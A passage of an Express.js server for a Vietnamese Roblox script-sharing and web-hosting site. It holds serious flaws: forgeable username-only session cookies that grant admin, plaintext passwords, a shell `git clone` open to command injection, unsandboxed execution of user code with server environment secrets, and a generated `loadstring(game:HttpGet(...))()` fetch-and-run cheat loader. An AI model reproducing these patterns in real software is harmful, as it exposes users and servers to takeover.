                <a href="/api-hosting" style="color:var(--vs-white);"><i class="ph ph-cloud-arrow-up"></i> Tạo Web (Hosting)</a>
                <a href="/ping" style="color:var(--vs-white);"><i class="ph ph-pulse"></i> Ping Monitor</a>
                <a href="/chat-vn"><i class="ph ph-chat-circle-dots"></i> VN Chat</a>
                <a href="/chat-global"><i class="ph ph-globe"></i> Global Chat</a>
                <a href="${DISCORD_INVITE_URL}" target="_blank" style="color:#5865F2;"><i class="ph-fill ph-discord-logo"></i> Discord Server</a>
                <a href="/tos"><i class="ph ph-scroll"></i> Terms of Service</a>
                <a href="/logout" style="color: var(--vs-text); margin-top: 40px;"><i class="ph ph-sign-out"></i> Logout</a>
            </div>
        ` : `
            <div class="user-badge">
                <i class="ph-fill ph-x-circle" style="margin-right:6px;"></i> Not Logged In
            </div>
            <div class="sidebar-menu" style="text-align:center;">
                <p style="font-size:12px; color:var(--vs-text); margin-bottom:15px;">Log in to securely save, edit, and manage your scripts globally.</p>
                <a href="/login" style="background:var(--vs-white); color:var(--vs-black); font-size:13px; margin-bottom:10px; justify-content:center;"><i class="ph ph-key"></i> Login</a>
                <a href="/register" style="background:var(--vs-border); color:var(--vs-white); font-size:13px; margin-bottom:20px; justify-content:center;"><i class="ph ph-user-plus"></i> Create Account</a>
                <div style="border-top: 1px solid var(--vs-border); padding-top: 10px;">
                    <a href="/api-hosting"><i class="ph ph-cloud-arrow-up"></i> Tạo Web (Hosting)</a>
                    <a href="/chat-vn"><i class="ph ph-chat-circle-dots"></i> VN Chat</a>
                    <a href="/chat-global"><i class="ph ph-globe"></i> Global Chat</a>
                    <a href="/tos" style="color:var(--vs-text);"><i class="ph ph-scroll"></i> Terms of Service</a>
                </div>
            </div>
        `}
    </div>

    <main>${content}</main>

    <!-- LOADING OVERLAY CHO TẠO WEB -->
    <div id="loader-overlay">
        <div class="terminal-window">
            <div class="terminal-header">
                <div class="terminal-dot" style="background:#333;"></div>
                <div class="terminal-dot" style="background:#555;"></div>
                <div class="terminal-dot" style="background:#777;"></div>
                <div style="color:var(--vs-text); font-size:12px; margin-left:10px; line-height:12px; font-family:'JetBrains Mono';">System Deploy</div>
            </div>
            <div class="terminal-body" id="term-body"></div>
        </div>
    </div>
</body>
</html>
`};

// ============================================================================
// 2. TẠO WEB HOSTING PROXY
// ============================================================================
app.get('/api-hosting', (req, res) => {
    const user = getCookie(req, 'user_session');
    if (!user) return res.redirect('/login?error=Bạn cần đăng nhập để sử dụng API Hosting.');

    const isAdmin = user === 'master1';
    let rowsHtml = '';
    
    apisDb.forEach((val, key) => {
        if (isAdmin || val.owner === user) {
            const statusColor = val.status === 'ONLINE' ? 'var(--vs-white)' : 'var(--vs-text)';
            const statusIcon = val.status === 'ONLINE' ? '<i class="ph-fill ph-check-circle"></i>' : '<i class="ph-fill ph-x-circle"></i>';
            rowsHtml += `
                <tr>
                    <td style="color:var(--vs-white); font-weight:bold;">${escapeHTML(val.name)}</td>
                    ${isAdmin ? `<td><span class="badge-admin">${val.owner.toUpperCase()}</span></td>` : ''}
                    <td><span style="color: ${statusColor}; font-weight: bold; display:flex; align-items:center; gap:6px;">${statusIcon} ${val.status === 'ONLINE' ? 'ONLINE' : 'OFFLINE'}</span></td>
                    <td style="color:var(--vs-text); font-family:'JetBrains Mono';">/app/${val.name}</td>
                    <td>
                        ${val.status === 'ONLINE' ? `
                            <button class="btn-action" onclick="openApiLink('${val.name}')"><i class="ph ph-arrow-square-out"></i> MỞ WEB</button>
                            <button class="btn-action" onclick="copyApiLink('${val.name}', this)"><i class="ph ph-copy"></i> COPY LINK</button>
                            <form action="/api-action/stop/${key}" method="POST" style="display:inline;"><button type="submit" class="btn-action"><i class="ph ph-stop-circle"></i> STOP</button></form>
                        ` : `
                            <form action="/api-action/start/${key}" method="POST" style="display:inline;"><button type="submit" class="btn-action" style="color:var(--vs-white); border-color:var(--vs-text);"><i class="ph ph-play-circle"></i> START</button></form>
                        `}
                        <form action="/api-action/delete/${key}" method="POST" style="display:inline;" onsubmit="return confirm('Bạn có chắc muốn xóa Web này vĩnh viễn?');"><button type="submit" class="btn-action btn-delete"><i class="ph ph-trash"></i> XÓA</button></form>
                    </td>
                </tr>
            `;
        }
    });

    const msg = req.query.msg;

    res.send(baseHTML(`
        <section class="hero">
            <div class="hero-badge"><i class="ph ph-cloud"></i> VANTASHIELD CLOUD PLATFORM</div>
            <h1><span class="line2">TẠO WEB (HOSTING)</span></h1>
            <p style="color:var(--vs-text); font-family:'JetBrains Mono'; font-size:14px;">Khởi tạo API/Web từ kho Github hoặc tạo thủ công với Proxy bảo mật.</p>
        </section>

        ${msg ? `<div class="center-card-wrap"><div class="alert alert-success"><i class="ph-fill ph-check-circle" style="margin-right:8px;"></i> ${escapeHTML(msg)}</div></div>` : ''}

        <div class="center-card-wrap" style="max-width: 1000px; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
            
            <!-- OPTION 1: DEPLOY FROM GITHUB -->
            <div class="quick-card" style="padding: 25px;">
                <div class="field-label" style="color: var(--vs-white); font-size: 15px; margin-bottom: 20px; text-align:center;">
                    <i class="ph ph-github-logo" style="font-size: 28px; margin-bottom: 8px; display: block;"></i> DEPLOY TỪ GITHUB
                </div>
                <form id="githubForm" onsubmit="handleAjaxDeploy(event, 'github')">
                    <label class="field-label">TÊN DỰ ÁN WEB</label>
                    <input type="text" name="project_name" placeholder="vidu: my-github-web" required pattern="[a-z0-9-]+" title="Chữ thường, số và gạch ngang">
                    
                    <label class="field-label">LINK KHO GITHUB (Public)</label>
                    <input type="text" name="repo_url" placeholder="https://github.com/user/repo.git" required>
                    
                    <p style="font-size: 11px; color: var(--vs-text); margin-top: -5px; margin-bottom: 15px;">Hệ thống sẽ tự động git clone, chạy npm install và start server.js.</p>
                    
                    <button type="submit" class="btn-save" style="margin-top: 10px;"><i class="ph ph-rocket-launch"></i> DEPLOY TỪ GITHUB</button>
                </form>
            </div>

            <!-- OPTION 2: CREATE DIRECTLY -->
            <div class="quick-card" style="padding: 25px;">
                <div class="field-label" style="color: var(--vs-white); font-size: 15px; margin-bottom: 20px; text-align:center;">
                    <i class="ph ph-terminal-window" style="font-size: 28px; margin-bottom: 8px; display: block;"></i> TẠO TRỰC TIẾP TẠI WEB
                </div>
                <form id="manualForm" onsubmit="handleAjaxDeploy(event, 'manual')">
                    <label class="field-label">TÊN DỰ ÁN WEB</label>
                    <input type="text" name="project_name" placeholder="vidu: my-local-web" required pattern="[a-z0-9-]+" title="Chữ thường, số và gạch ngang">
                    
                    <label class="field-label"><i class="ph ph-file-code"></i> package.json</label>
                    <textarea name="pkg_json" style="height: 100px; font-family: 'JetBrains Mono'; margin-bottom: 15px;">{
  "name": "my-web",
  "version": "1.0.0",
  "main": "server.js",
  "dependencies": {
    "express": "^4.19.2"
  }
}</textarea>
                    
                    <label class="field-label"><i class="ph ph-file-js"></i> server.js</label>
                    <textarea name="srv_js" style="height: 150px; font-family: 'JetBrains Mono'; margin-bottom: 15px;">const express = require('express');
const app = express();
app.get('/', (req, res) => res.send('<h1>Web tạo thành công!</h1>'));
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Running'));</textarea>
                    
                    <button type="submit" class="btn-save"><i class="ph ph-hammer"></i> TẠO WEB BẰNG TAY</button>
                </form>
            </div>
        </div>

        <div class="center-card-wrap" style="max-width: 1000px;">
            <div class="quick-card">
                <div class="field-label" style="margin-bottom: 15px;"><i class="ph ph-hard-drives"></i> CÁC WEB ĐANG HOẠT ĐỘNG CỦA BẠN</div>
                <div class="manage-wrap">
                    <table class="manage-table">
                        <thead>
                            <tr>
                                <th>TÊN DỰ ÁN</th>
                                ${isAdmin ? '<th>CHỦ SỞ HỮU</th>' : ''}
                                <th>TRẠNG THÁI</th>
                                <th>ĐƯỜNG DẪN PROXY</th>
                                <th>HÀNH ĐỘNG</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${rowsHtml || `<tr><td colspan="${isAdmin ? 5 : 4}" style="text-align:center; color:var(--vs-text); padding: 20px;">Bạn chưa tạo web nào.</td></tr>`}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <script>
        async function handleAjaxDeploy(e, type) {
            e.preventDefault();
            const form = e.target;
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());

            const overlay = document.getElementById('loader-overlay');
            const term = document.getElementById('term-body');
            overlay.style.display = 'flex';
            term.innerHTML = '';

            const appendTerm = (text, delay = 0) => {
                return new Promise(resolve => {
                    setTimeout(() => {
                        const p = document.createElement('div');
                        p.className = 'term-line';
                        p.innerHTML = text;
                        term.appendChild(p);
                        resolve();
                    }, delay);
                });
            };

            await appendTerm('> System: Đang kiểm tra dữ liệu đầu vào...', 500);
            await appendTerm('> System: Đang cấp phát thư mục [ ' + data.project_name + ' ]...', 800);
            
            let endpoint = '/api-deploy-ajax';
            if (type === 'github') {
                endpoint = '/api-deploy-github-ajax';
                await appendTerm('> GitHub: Đang tiến hành Clone dữ liệu từ Repo...', 800);
                await appendTerm('> GitHub: Quá trình clone có thể mất một lúc <span class="blink">_</span>', 1000);
            } else {
                await appendTerm('> System: Đang khởi tạo file package.json & server.js...', 600);
                await appendTerm('> NPM: Đang cài đặt thư viện <span class="blink">_</span>', 500);
            }

            try {
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                const result = await response.json();
                
                if (result.success) {
                    await appendTerm('<span style="color:var(--vs-white);">> NPM: Cài đặt hoàn tất!</span>', 0);
                    await appendTerm('> Server: Đang khởi động Node.js backend...', 800);
                    await appendTerm('<br><span style="color:var(--vs-white); font-size:16px; font-weight:bold;">[ TẠO WEB THÀNH CÔNG ]</span>', 800);
                    await appendTerm('Link proxy: ' + window.location.origin + '/app/' + result.name, 500);
                    await appendTerm('Hệ thống tải lại trang sau 3 giây...', 1000);
                    
                    setTimeout(() => {
                        window.location.href = '/api-hosting?msg=Tạo web thành công!';
                    }, 3000);
                } else {
                    await appendTerm('<br><span style="color:#ef4444;">[ LỖI ] ' + result.message + '</span>', 0);
                    await appendTerm('<button onclick="document.getElementById(\\'loader-overlay\\').style.display=\\'none\\'" style="margin-top:15px; padding:8px 16px; background:#fff; color:#000; border:none; cursor:pointer; font-weight:bold; border-radius:6px; font-family:\\'Orbitron\\'">ĐÓNG</button>', 0);
                }
            } catch (err) {
                await appendTerm('<br><span style="color:#ef4444;">[ LỖI MẠNG ] Không thể kết nối tới server.</span>', 0);
            }
        }
        </script>
    `, user));
});

// AJAX Handler cho "TẠO BẰNG TAY"
app.post('/api-deploy-ajax', async (req, res) => {
    const user = getCookie(req, 'user_session');
    if (!user) return res.json({ success: false, message: 'Bạn chưa đăng nhập.' });

    let { project_name, pkg_json, srv_js } = req.body;
    project_name = project_name.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
    if (!project_name) return res.json({ success: false, message: 'Tên dự án không hợp lệ.' });

    let nameExists = Array.from(apisDb.values()).some(api => api.name === project_name);
    if (nameExists) return res.json({ success: false, message: 'Tên dự án này đã tồn tại!' });

    const apiId = crypto.randomBytes(4).toString('hex');
    const port = getFreePort();
    const apiDir = path.join(__dirname, 'hosted_apis', apiId);

    try {
        if (!fs.existsSync(path.join(__dirname, 'hosted_apis'))) fs.mkdirSync(path.join(__dirname, 'hosted_apis'));
        fs.mkdirSync(apiDir, { recursive: true });

        fs.writeFileSync(path.join(apiDir, 'package.json'), pkg_json);
        fs.writeFileSync(path.join(apiDir, 'server.js'), srv_js);

        apisDb.set(apiId, { id: apiId, owner: user, name: project_name, port: port, status: 'OFFLINE', createdAt: Date.now() });
        saveApis();

        exec('npm install', { cwd: apiDir }, (error, stdout, stderr) => {
            if (error) return res.json({ success: false, message: 'Lỗi npm install. Kiểm tra package.json' });
            startApiProcess(apiId);
            res.json({ success: true, name: project_name });
        });
    } catch (err) {
        res.json({ success: false, message: 'Lỗi hệ thống khi tạo file.' });
    }
});

// AJAX Handler cho "DEPLOY GITHUB"
app.post('/api-deploy-github-ajax', async (req, res) => {
    const user = getCookie(req, 'user_session');
    if (!user) return res.json({ success: false, message: 'Bạn chưa đăng nhập.' });

    let { project_name, repo_url } = req.body;
    project_name = project_name.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
    if (!project_name) return res.json({ success: false, message: 'Tên dự án không hợp lệ.' });
    
    repo_url = repo_url.trim().replace(/"/g, ''); 
    if (!repo_url.startsWith('http') || !repo_url.includes('github.com')) {
        return res.json({ success: false, message: 'Link Repo GitHub không hợp lệ.' });
    }

    let nameExists = Array.from(apisDb.values()).some(api => api.name === project_name);
    if (nameExists) return res.json({ success: false, message: 'Tên dự án này đã tồn tại!' });

    const apiId = crypto.randomBytes(4).toString('hex');
    const port = getFreePort();
    const apiDir = path.join(__dirname, 'hosted_apis', apiId);

    try {
        if (!fs.existsSync(path.join(__dirname, 'hosted_apis'))) fs.mkdirSync(path.join(__dirname, 'hosted_apis'));
        fs.mkdirSync(apiDir, { recursive: true });

        exec(`git clone "${repo_url}" .`, { cwd: apiDir }, (errClone, stdoutC, stderrC) => {
            if (errClone) return res.json({ success: false, message: 'Không thể Clone GitHub. Repo có thể bị Private hoặc sai link.' });

            apisDb.set(apiId, { id: apiId, owner: user, name: project_name, port: port, status: 'OFFLINE', createdAt: Date.now() });
            saveApis();

            if (fs.existsSync(path.join(apiDir, 'package.json'))) {
                exec('npm install', { cwd: apiDir }, (error, stdout, stderr) => {
                    startApiProcess(apiId);
                    res.json({ success: true, name: project_name });
                });
            } else {
                startApiProcess(apiId);
                res.json({ success: true, name: project_name });
            }
        });
    } catch (err) {
        res.json({ success: false, message: 'Lỗi hệ thống khi thiết lập GitHub.' });
    }
});

// Khởi chạy server con Node.js
function startApiProcess(apiId) {
    const api = apisDb.get(apiId);
    if (!api) return;

    const apiDir = path.join(__dirname, 'hosted_apis', apiId);
    
    try {
        const child = spawn('node', ['server.js'], {
            cwd: apiDir,
            env: { ...process.env, PORT: api.port } 
        });

        runningProcesses[apiId] = child;
        api.status = 'ONLINE';
        api.pid = child.pid;
        apisDb.set(apiId, api);
        saveApis();

        child.on('exit', (code) => {
            console.log(`[API HOSTING] Project ${api.name} exited.`);
            if (apisDb.has(apiId)) {
                let dbApi = apisDb.get(apiId);
                dbApi.status = 'OFFLINE';
                dbApi.pid = null;
                apisDb.set(apiId, dbApi);
                saveApis();
            }
            delete runningProcesses[apiId];
        });
    } catch(e) {
        console.error("Lỗi khởi tạo Process", e);
    }
}

app.post('/api-action/:action/:id', (req, res) => {
    const user = getCookie(req, 'user_session');
    const isAdmin = user === 'master1';
    const { action, id } = req.params;
    
    const api = apisDb.get(id);
    if (!api || (!isAdmin && api.owner !== user)) return res.redirect('/api-hosting');

    if (action === 'stop' && runningProcesses[id]) {
        runningProcesses[id].kill();
        delete runningProcesses[id];
        api.status = 'OFFLINE';
        apisDb.set(id, api);
        saveApis();
        return res.redirect('/api-hosting?msg=Đã dừng Web.');
    } else if (action === 'start' && !runningProcesses[id]) {
        startApiProcess(id);
        return res.redirect('/api-hosting?msg=Đã khởi động lại Web.');
    } else if (action === 'delete') {
        if (runningProcesses[id]) {
            runningProcesses[id].kill();
            delete runningProcesses[id];
        }
        const apiDir = path.join(__dirname, 'hosted_apis', id);
        if (fs.existsSync(apiDir)) fs.rmSync(apiDir, { recursive: true, force: true });
        apisDb.delete(id);
        saveApis();
        return res.redirect('/api-hosting?msg=Đã xóa Web vĩnh viễn.');
    }
    res.redirect('/api-hosting');
});

// ============================================================================
// 3. KHU VỰC TRÒ CHUYỆN TOÀN CẦU VÀ VIỆT NAM (PERSISTENT API)
// ============================================================================
app.get('/api/chat/:room', (req, res) => {
    const room = req.params.room;
    if (room !== 'vn' && room !== 'global') return res.status(400).json({ error: 'Invalid room' });
    res.json({ chat: chatDb[room] });
});

app.post('/api/chat/:room', (req, res) => {
    const room = req.params.room;
    if (room !== 'vn' && room !== 'global') return res.status(400).json({ error: 'Invalid room' });
    
    const user = getCookie(req, 'user_session') || 'Anonymous';
    const { message } = req.body;
    if (!message || message.trim() === '') return res.status(400).json({ error: 'Empty message' });

    chatDb[room].push({ user: user, message: message.trim(), time: Date.now() });
    if (chatDb[room].length > 150) chatDb[room].shift();
    saveChat();
    
    res.json({ success: true });
});

const chatTemplate = (title, badgeClass, welcomeMsg, roomName, userSession) => `
    <section class="hero">
        <div class="hero-badge"><i class="ph ph-chats"></i> ${title.toUpperCase()} SERVER</div>
        <h1><span class="line2">${title}</span></h1>
    </section>
    <div class="center-card-wrap" style="max-width: 800px;">
        <div class="chat-box">
            <div class="chat-messages" id="chatArea">
                <div class="chat-msg msg-bot">${welcomeMsg}</div>
            </div>
            <div class="chat-input-area">
                <button class="btn-attach" title="Attach File/Image" onclick="document.getElementById('fileUpload').click()"><i class="ph ph-paperclip"></i></button>
                <input type="file" id="fileUpload" style="display:none" accept="image/*,video/*,.txt,.lua,.zip">
                <input type="text" class="chat-input" placeholder="Type your message here..." id="chatInput" onkeypress="if(event.key === 'Enter') sendUI()">
                <button class="btn-send" onclick="sendUI()"><i class="ph-fill ph-paper-plane-right"></i> SEND</button>
            </div>
        </div>
    </div>
    <script>
        let currentRoom = '${roomName}';
        let currentUser = '${userSession || 'Anonymous'}';

        function escapeHTML(str) {
            return (str || '').replace(/[&<>'"]/g, tag => ({
                '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;'
            }[tag] || tag));
        }

        async function fetchChat() {
            try {
                const res = await fetch('/api/chat/' + currentRoom);
                const data = await res.json();
                renderChat(data.chat);
            } catch (e) {}
        }

        function renderChat(chatList) {
            const chatArea = document.getElementById('chatArea');
            const isScrolledToBottom = chatArea.scrollHeight - chatArea.clientHeight <= chatArea.scrollTop + 50;
            
            chatArea.innerHTML = '<div class="chat-msg msg-bot">${welcomeMsg}</div>';
            chatList.forEach(c => {
                const isMe = c.user === currentUser;
                const msgDiv = document.createElement('div');
                msgDiv.innerHTML = '<b style="color:' + (isMe ? 'var(--vs-white)' : 'var(--vs-text)') + '; font-family:Orbitron; font-size: 12px; display:flex; align-items:center; gap:4px;"><i class="ph-fill ph-user"></i> ' + escapeHTML(c.user) + '</b><br><span style="margin-top:4px; display:block;">' + escapeHTML(c.message) + '</span>';
                
                if (isMe) {
                    msgDiv.className = 'chat-msg msg-user';
                } else {
                    msgDiv.className = 'chat-msg msg-bot';
                }
                chatArea.appendChild(msgDiv);
            });

            if (isScrolledToBottom) {
                chatArea.scrollTop = chatArea.scrollHeight;
            }
        }

        async function sendUI() {
            const input = document.getElementById('chatInput');
            const val = input.value.trim();
            if(!val) return;
            input.value = '';
            
            const chatArea = document.getElementById('chatArea');
            chatArea.innerHTML += '<div class="chat-msg msg-user"><b style="color:var(--vs-white); font-family:Orbitron; font-size: 12px; display:flex; align-items:center; gap:4px;"><i class="ph-fill ph-user"></i> ' + escapeHTML(currentUser) + '</b><br><span style="margin-top:4px; display:block;">' + escapeHTML(val) + '</span></div>';
            chatArea.scrollTop = chatArea.scrollHeight;

            await fetch('/api/chat/' + currentRoom, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ message: val })
            });
            fetchChat();
        }

        setInterval(fetchChat, 3000);
        setTimeout(fetchChat, 200);
    </script>
`;

app.get('/chat-vn', (req, res) => {
    const user = getCookie(req, 'user_session');
    res.send(baseHTML(chatTemplate('VN Chat', 'badge-vn', 'Chào mừng đến với máy chủ chat Việt Nam. Tin nhắn được lưu trữ vĩnh viễn trên Server.', 'vn', user), user));
});

app.get('/chat-global', (req, res) => {
    const user = getCookie(req, 'user_session');
    res.send(baseHTML(chatTemplate('Global Chat', 'badge-global', 'Welcome to the Global Hub Chat. All messages are securely persisted on the Server.', 'global', user), user));
});


// ============================================================================
// 4. CÁC TUYẾN ĐƯỜNG ĐIỀU HƯỚNG CHÍNH (HOME, DASHBOARD, LOGIN, TOS, RAW)
// ============================================================================
app.get('/', (req, res) => {
    const user = getCookie(req, 'user_session');
    res.send(baseHTML(`
        <section class="hero">
            <div class="hero-badge"><i class="ph-fill ph-shield-check"></i> BRAND NEW RAW SYSTEM WITH ANTI-SKID</div>
            <h1><span class="line2">RAW HUB CODESHARE</span></h1>
        </section>
        <div class="center-card-wrap">
            <div class="quick-card">
                <form action="/create" method="POST">
                    <div class="header-flex">
                        <label class="field-label" style="margin: 0;"><i class="ph ph-file-code"></i> SCRIPT CONTENT (LUA / TXT)</label>
                        <label class="btn-upload">
                            <i class="ph ph-upload-simple" style="font-size:16px;"></i> UPLOAD FILE...
                            <input type="file" accept=".lua,.txt,.luau,.js" onchange="handleFileUpload(event)">
                        </label>
                    </div>
                    <textarea id="codeArea" name="code" placeholder="-- Type your script here, or click [UPLOAD FILE] to insert code..." required></textarea>
                    
                    <label class="field-label" style="margin-top: 15px;"><i class="ph ph-text-t"></i> CUSTOM FILE NAME (OPTIONAL)</label>
                    <input type="text" name="fileName" placeholder="e.g. auto-farm" pattern="[a-zA-Z0-9-_]+" title="Only letters, numbers, dashes and underscores">

                    <button type="submit" class="btn-save"><i class="ph-fill ph-lock-key"></i> SECURE & GENERATE RAW LINK</button>
                </form>
            </div>
        </div>
    `, user));
});

// ĐÃ XÓA TRIỆT ĐỂ KHỐI HTML CHỨA NÚT "NHẤP VÀO ĐÂY ĐỂ XEM MÃ NGUỒN GỐC (BYPASS)"
app.post('/create', (req, res) => {
    const user = getCookie(req, 'user_session') || 'guest_anonymous';
    const { code, fileName } = req.body;
    
    const id = crypto.randomBytes(4).toString('hex');
    
    const safeFileName = (fileName && fileName.trim() !== '') ? fileName.trim().replace(/[^a-zA-Z0-9_-]/g, '') : id;
    const rawCreatorName = user === 'guest_anonymous' ? 'anonymous' : user;

    db.set(id, { code, owner: user, fileName: safeFileName, createdAt: Date.now() });
    saveDb(); 
    
    const host = req.get('host');
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const rawLink = `${protocol}://${host}/${rawCreatorName}/${safeFileName}/refs/heads/main/${safeFileName}`;
    const loadstringCommand = `loadstring(game:HttpGet("${rawLink}"))()`;

    res.send(baseHTML(`
        <section class="hero"><h1><span class="line2">RAW GENERATED!</span></h1></section>
        <div class="center-card-wrap" style="max-width: 650px;">
            <div class="quick-card">
                <div class="result-box">
                    <div style="font-size: 11px; color: var(--vs-text); margin-bottom: 5px;"><i class="ph ph-terminal"></i> EXECUTOR LOADSTRING:</div>
                    <button type="button" class="copy-btn" onclick="copyText('loadstring-text', this)"><i class="ph ph-copy"></i> COPY</button>
                    <div class="code-preview" id="loadstring-text">${loadstringCommand}</div>
                </div>
                
                <br>
                <a href="/" class="btn-save" style="background: var(--vs-black); color: var(--vs-text-light); border: 1px solid var(--vs-border);"><i class="ph ph-plus"></i> CREATE ANOTHER</a>
            </div>
        </div>
    `, user === 'guest_anonymous' ? null : user));
});

app.get('/register', (req, res) => {
    const error = req.query.error;
    res.send(baseHTML(`
        <section class="hero"><h1><span class="line2">CREATE NEW ACCOUNT</span></h1></section>
        <div class="center-card-wrap" style="max-width: 450px;">
            <div class="quick-card">
                ${error ? `<div class="alert"><i class="ph-fill ph-warning"></i> ${escapeHTML(error)}</div>` : ''}
                <form action="/register" method="POST">
                    <label class="field-label"><i class="ph ph-user"></i> USERNAME</label>
                    <input type="text" name="username" placeholder="Enter username..." required minlength="3">
                    <label class="field-label"><i class="ph ph-lock-key"></i> PASSWORD</label>
                    <input type="password" name="password" placeholder="Enter password..." required minlength="4">
                    <button type="submit" class="btn-save" style="margin-top:10px;"><i class="ph ph-user-plus"></i> REGISTER NOW</button>
                </form>
                <div style="text-align:center; margin-top:20px; font-size:13px; color:var(--vs-text);">
                    Already have an account? <a href="/login" style="color:var(--vs-white); font-weight:bold;">Login here</a>
                </div>
            </div>
        </div>
    `));
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;
    const cleanUsername = username.trim().toLowerCase();
    
    if (cleanUsername === 'master1' || usersDb.has(cleanUsername)) {
        return res.redirect('/register?error=Username already exists!');
    }
    usersDb.set(cleanUsername, { password });
    saveUsers(); 
    res.redirect('/login?success=Registration successful! Please login.');
});

app.get('/login', (req, res) => {
    const error = req.query.error;
    const success = req.query.success;
    res.send(baseHTML(`
        <section class="hero"><h1><span class="line2">SYSTEM LOGIN</span></h1></section>
        <div class="center-card-wrap" style="max-width: 450px;">
            <div class="quick-card">
                ${error ? `<div class="alert"><i class="ph-fill ph-warning"></i> ${escapeHTML(error)}</div>` : ''}
                ${success ? `<div class="alert alert-success"><i class="ph-fill ph-check-circle"></i> ${escapeHTML(success)}</div>` : ''}
                <form action="/login" method="POST">
                    <label class="field-label"><i class="ph ph-user"></i> USERNAME</label>
                    <input type="text" name="username" placeholder="Enter username..." required>
                    <label class="field-label"><i class="ph ph-lock-key"></i> PASSWORD</label>
                    <input type="password" name="password" placeholder="Enter password..." required>
                    <button type="submit" class="btn-save" style="margin-top:10px;"><i class="ph ph-sign-in"></i> ACCESS SYSTEM</button>
                </form>
                <div style="display:flex; align-items:center; gap:10px; margin:20px 0;"><div style="flex:1;height:1px;background:var(--vs-border);"></div><span style="color:var(--vs-text); font-size:11px;">OR SIGN IN WITH</span><div style="flex:1;height:1px;background:var(--vs-border);"></div></div>
                <a href="/auth/google" class="btn-save" style="background:#fff; color:#000; margin-bottom:10px;"><i class="ph ph-google-logo"></i> GOOGLE</a>
                <a href="/auth/github" class="btn-save" style="background:#24292e; color:#fff; margin-bottom:10px;"><i class="ph ph-github-logo"></i> GITHUB</a>
                <a href="/auth/discord" class="btn-save" style="background:#5865F2; color:#fff;"><i class="ph-fill ph-discord-logo"></i> DISCORD</a>
                <p style="color:var(--vs-text); font-size:11px; text-align:center; margin-top:15px;">Bạn phải vào <a href="${DISCORD_INVITE_URL}" target="_blank" style="color:#5865F2;">Discord Server</a> trước khi được truy cập.</p>
            </div>
        </div>
    `));
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const cleanUsername = username.trim().toLowerCase();
    const user = usersDb.get(cleanUsername);

    if (user && user.password === password) {
        res.cookie('user_session', cleanUsername, { maxAge: 1000 * 60 * 60 * 24 * 7, httpOnly: true });
        res.redirect('/discord-verify');
    } else {
        res.redirect('/login?error=Invalid username or password!');
    }
});

app.get('/logout', (req, res) => {
    res.clearCookie('user_session');
    res.redirect('/');
});

app.get('/dashboard', (req, res) => {
    const user = getCookie(req, 'user_session');
    if (!user) {
        return res.send(baseHTML(`
            <div class="center-card-wrap" style="margin-top:80px; max-width:500px; text-align:center;">
                <div class="quick-card">
                    <h2 style="color:var(--vs-white); font-family:'Orbitron'"><i class="ph-fill ph-warning" style="color:var(--vs-text);"></i> ACCESS DENIED</h2>
                    <p style="color:var(--vs-text); font-size:14px; margin-bottom: 20px;">You must log in to access the script management panel.</p>
                    <a href="/login" class="btn-save"><i class="ph ph-key"></i> LOGIN NOW</a>
                </div>
            </div>
        `));
    }

    const isAdmin = user === 'master1';
    const SEVEN_DAYS = 7 * 24 * 60 * 60 * 1000;
    const now = Date.now();
    let rowsHtml = '';

    db.forEach((val, key) => {
        const fileAge = now - (val.createdAt || now);
        if (val.owner === 'master1' && fileAge > SEVEN_DAYS) return;

        if (isAdmin || val.owner === user) {
            rowsHtml += `
                <tr>
                    <td style="color:var(--vs-white); font-weight:bold; font-family:'JetBrains Mono';">${val.fileName || key}</td>
                    ${isAdmin ? `<td><span class="badge-admin">${val.owner.toUpperCase()}</span></td>` : ''}
                    <td style="max-width:180px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color: var(--vs-text-light);">
                        ${escapeHTML(val.code.substring(0, 35))}...
                    </td>
                    <td>
                        <a href="/edit/${key}" class="btn-action"><i class="ph ph-pencil-simple"></i> EDIT</a>
                        <a href="/delete/${key}" class="btn-action btn-delete" onclick="return confirm('Confirm delete?')"><i class="ph ph-trash"></i> DEL</a>
                        ${isAdmin ? `<a href="/download/${key}" class="btn-action"><i class="ph ph-download-simple"></i> DL</a>` : ''}
                    </td>
                </tr>
            `;
        }
    });

    res.send(baseHTML(`
        <section class="hero"><h1><span class="line2">${isAdmin ? 'MASTER DASHBOARD' : 'SCRIPT MANAGEMENT'}</span></h1></section>
        <div class="center-card-wrap" style="max-width: 900px;">
            <div class="quick-card">
                <div class="field-label" style="margin-bottom: 15px;">
                    <i class="ph ph-folder-open"></i> ${isAdmin ? 'ALL SYSTEM SCRIPTS (Admin View)' : `CODES FOR [${escapeHTML(user.toUpperCase())}]:`}
                </div>
                <div style="margin-bottom: 20px; padding: 12px; background: rgba(255,255,255,0.02); border-radius: 8px; border-left: 4px solid var(--vs-white);">
                    ${isAdmin 
                        ? `<span style="font-size:12px; color:var(--vs-text);"><i class="ph-fill ph-info"></i> Admin Note: Admin scripts older than 7 days are automatically hidden.</span>`
                        : `<div class="cyber-text-alert"><i class="ph-fill ph-shield-check"></i> V1 PROTECTION: LAYER 7 ANTI-SKID FIREWALL ACTIVE.</div>`
                    }
                </div>
                <div class="manage-wrap">
                    <table class="manage-table">
                        <thead>
                            <tr>
                                <th>SCRIPT ID / NAME</th>
                                ${isAdmin ? '<th>OWNER</th>' : ''}
                                <th>PREVIEW</th>
                                <th>ACTIONS</th>
                            </tr>
                        </thead>
                        <tbody>
                            ${rowsHtml || `<tr><td colspan="${isAdmin ? 4 : 3}" style="text-align:center; color:var(--vs-text); padding: 20px;">No scripts found.</td></tr>`}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    `, user));
});

app.get('/download/:id', (req, res) => {
    const user = getCookie(req, 'user_session');
    if (user !== 'master1') return res.status(403).send("Admin strictly.");
    const id = req.params.id;
    const scriptData = db.get(id);
